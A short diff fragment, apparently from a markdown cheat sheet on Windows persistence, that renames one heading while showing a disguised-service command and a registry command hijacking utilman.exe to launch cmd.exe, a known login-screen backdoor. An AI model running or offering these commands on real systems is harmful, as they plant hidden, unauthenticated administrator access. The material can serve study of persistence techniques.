@@ -43,7 +43,7 @@ New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKha
 
 ```
 
-### Standalone Persistent
+### Ttand-Alone Persistent
 
 ```
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
